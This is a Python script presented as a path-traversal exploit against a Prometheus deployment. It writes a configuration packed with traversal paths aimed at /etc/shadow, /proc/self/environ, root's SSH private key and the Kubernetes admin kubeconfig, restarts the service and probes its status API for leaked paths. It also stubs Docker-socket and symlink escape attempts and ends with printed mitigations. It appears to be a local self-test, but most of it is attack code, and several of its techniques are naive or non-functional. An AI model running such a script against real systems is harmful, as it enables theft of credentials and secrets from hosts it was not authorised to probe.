#!/usr/bin/env python3
"""
Exploit: Path Traversal via Volume Mounts
Target: Prometheus configuration loading
Impact: Read access to host files
"""

import os
import time
import subprocess
import requests
import json

def create_malicious_config():
    """Create Prometheus config with path traversal"""
    print("[*] Creating malicious Prometheus configuration...")
    
    # Backup original config
    if os.path.exists("prometheus.yml"):
        os.rename("prometheus.yml", "prometheus.yml.backup")
    
    # Create config with various path traversal attempts
    malicious_config = """
global:
  scrape_interval: 15s
  evaluation_interval: 15s
  # Attempt to read host files through external_labels
  external_labels:
    host_passwd: '/etc/../../../../../../../etc/passwd'
    host_shadow: '/etc/../../../../../../../etc/shadow'

# Rule files with path traversal
rule_files:
  - '/etc/prometheus/../../../../../../../etc/passwd'
  - '/prometheus/../../../../../../../etc/hosts'

scrape_configs:
  # Try to include host files
  - job_name: 'traversal_test'
    file_sd_configs:
      - files:
          # Various traversal attempts
          - '../../../../../../../etc/passwd'
          - '/etc/prometheus/../../../../../../../etc/shadow'
          - '/prometheus/../../../../proc/self/environ'
    
  # Kubernetes SD with malicious config
  - job_name: 'k8s_traversal'
    kubernetes_sd_configs:
      - role: pod
        kubeconfig_file: '../../../../../../../etc/kubernetes/admin.conf'
        
  # Static config with suspicious labels
  - job_name: 'static_traversal'
    static_configs:
      - targets: ['localhost:9090']
        labels:
          __tmp_file_1: '/etc/../../../../../../../etc/passwd'
          __tmp_file_2: '/var/lib/../../../../../../../etc/shadow'
          __meta_file: '/prometheus/../../../../../../root/.ssh/id_rsa'
"""
    
    with open("prometheus.yml", "w") as f:
        f.write(malicious_config)
    
    print("[+] Malicious config created")

def test_directory_traversal():
    """Test various directory traversal vectors"""
    print("\n[*] Testing directory traversal vectors...")
    
    # Start Prometheus with malicious config
    print("[*] Starting Prometheus with traversal config...")
    subprocess.run(["./manage.sh", "up"], capture_output=True)
    
    # Wait for Prometheus to start
    time.sleep(5)
    
    # Test 1: Check configuration endpoint
    print("\n[*] Test 1: Checking configuration endpoint...")
    try:
        r = requests.get("http://localhost:9090/api/v1/status/config")
        if r.status_code == 200:
            config = r.json()
            config_yaml = config.get('data', {}).get('yaml', '')
            if '/etc/passwd' in config_yaml or 'root:' in config_yaml:
                print("[+] Path traversal successful in config!")
                print("[+] Exposed configuration contains sensitive paths")
    except Exception as e:
        print(f"[-] Error: {e}")
    
    # Test 2: Check file_sd targets
    print("\n[*] Test 2: Checking file service discovery...")
    try:
        r = requests.get("http://localhost:9090/api/v1/targets")
        if r.status_code == 200:
            targets = r.json()
            for target in targets.get('data', {}).get('activeTargets', []):
                discovered_labels = target.get('discoveredLabels', {})
                if '__meta_filepath' in discovered_labels:
                    filepath = discovered_labels['__meta_filepath']
                    if '../' in filepath or '/etc/' in filepath:
                        print(f"[+] Suspicious file path in targets: {filepath}")
    except Exception as e:
        print(f"[-] Error: {e}")
    
    # Test 3: Check for error messages revealing paths
    print("\n[*] Test 3: Checking error messages...")
    try:
        r = requests.get("http://localhost:9090/api/v1/rules")
        if r.status_code == 200:
            data = r.text
            if 'permission denied' in data.lower() or 'no such file' in data.lower():
                print("[+] Error messages reveal path traversal attempts")
                if '/etc/passwd' in data or '/etc/shadow' in data:
                    print("[+] Sensitive file paths exposed in errors!")
    except Exception as e:
        print(f"[-] Error: {e}")

def test_docker_socket_mount():
    """Test if Docker socket is accessible"""
    print("\n[*] Testing Docker socket access...")
    
    # Create config that tries to access Docker socket
    socket_config = """
global:
  scrape_interval: 15s

scrape_configs:
  - job_name: 'docker'
    static_configs:
      - targets: ['unix:///var/run/docker.sock:/v1.24/containers/json']
"""
    
    with open("prometheus_docker.yml", "w") as f:
        f.write(socket_config)
    
    # Test if we can query Docker through Prometheus
    # This would be a critical vulnerability if successful

def exploit_symlink_traversal():
    """Attempt to exploit through symlinks"""
    print("\n[*] Testing symlink traversal...")
    
    # Create a symlink pointing outside the mounted directory
    symlink_config = """
# Prometheus config with symlink references
global:
  scrape_interval: 15s

# Include rule files via symlinks
rule_files:
  - 'rules/sensitive_link.yml'
"""
    
    # This would require write access to create symlinks
    # In the container, which could then point to host files

def demonstrate_volume_mount_risks():
    """Show risks of unrestricted volume mounts"""
    print("\n[!] Volume Mount Risks Demonstrated:")
    print("    1. Config files can reference paths outside mounted dirs")
    print("    2. No validation on file paths in configuration")
    print("    3. Error messages may reveal sensitive information")
    print("    4. Symlinks could potentially escape mount boundaries")
    print("    5. Process can attempt to read any file path")

def cleanup():
    """Restore original configuration"""
    print("\n[*] Cleaning up...")
    subprocess.run(["./manage.sh", "down"], capture_output=True)
    
    if os.path.exists("prometheus.yml.backup"):
        os.rename("prometheus.yml.backup", "prometheus.yml")
    
    if os.path.exists("prometheus_docker.yml"):
        os.remove("prometheus_docker.yml")

if __name__ == "__main__":
    print("="*50)
    print("Path Traversal Exploit via Volume Mounts")
    print("="*50)
    
    try:
        create_malicious_config()
        test_directory_traversal()
        test_docker_socket_mount()
        exploit_symlink_traversal()
        demonstrate_volume_mount_risks()
    finally:
        cleanup()
    
    print("\n[!] Mitigation:")
    print("    - Validate all file paths in configuration")
    print("    - Use read-only mounts with :ro flag")
    print("    - Restrict container user permissions")
    print("    - Implement path sanitization")